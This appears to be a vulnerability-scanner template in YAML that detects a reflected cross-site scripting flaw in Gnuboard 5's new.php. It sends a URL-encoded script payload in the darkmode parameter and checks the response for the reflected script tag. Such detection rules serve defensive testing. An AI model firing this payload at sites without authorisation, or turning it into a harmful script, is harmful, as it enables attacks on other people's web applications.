id: "gnuboard5-xss"
name: "Gnuboard 5 - Cross-Site Scripting"
severity: "medium"
description: "Gnuboard 5 contains a cross-site scripting vulnerability via the clean_xss_tags() function called in new.php."
tech:
  - "php"
tags:
  - "xss"
  - "gnuboard"
  - "gnuboard5"
  - "huntr"
  - "vuln"
cwe: "CWE-80"
reference: "https://huntr.dev/bounties/ad2a9b32-fe6c-43e9-9b05-2c77c58dde6a/"
spaExclusion: true
request:
  method: "GET"
  path: "/bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
control:
  method: "GET"
  path: "/.kovo-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "header\\\"><script>alert(document.domain)</script>.css?"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
